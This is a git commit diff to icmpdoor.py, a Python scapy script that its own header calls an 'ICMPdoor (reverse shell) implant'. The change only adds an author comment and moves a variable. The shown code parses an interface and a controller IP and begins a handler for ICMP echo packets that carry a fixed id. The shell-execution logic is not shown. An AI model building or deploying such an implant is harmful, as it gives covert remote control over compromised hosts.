463f23439cc2e777cbd7c3f9823cf35cef2dc517
Jeroen van Kessel <krabbedoelie@hotmail.com>
2020-11-14 11:38:31 +0100

    Update icmpdoor.py

--- icmpdoor.py
+++ icmpdoor.py
@@ -1,15 +1,17 @@
 #!/usr/bin/python3
+#By krabelize | cryptsus.com
+#ICMPdoor (reverse shell) implant
 from scapy.all import *
 import argparse
 import os
+
+#Variables
+icmp_id = int(13170)
 
 parser = argparse.ArgumentParser()
 parser.add_argument('-i', '--interface', type=str, required=True, help="(Virtual) Network Interface (e.g. eth0)")
 parser.add_argument('-d', '--destination_ip', type=str, required=True, help="Destination IP address")
 args = parser.parse_args()
-
-#Variables
-icmp_id = int(13170)
 
 def icmpshell(pkt):
     if pkt[IP].src == args.destination_ip and pkt[ICMP].type == 8 and pkt[ICMP].id == icmp_id and pkt[Raw].load:
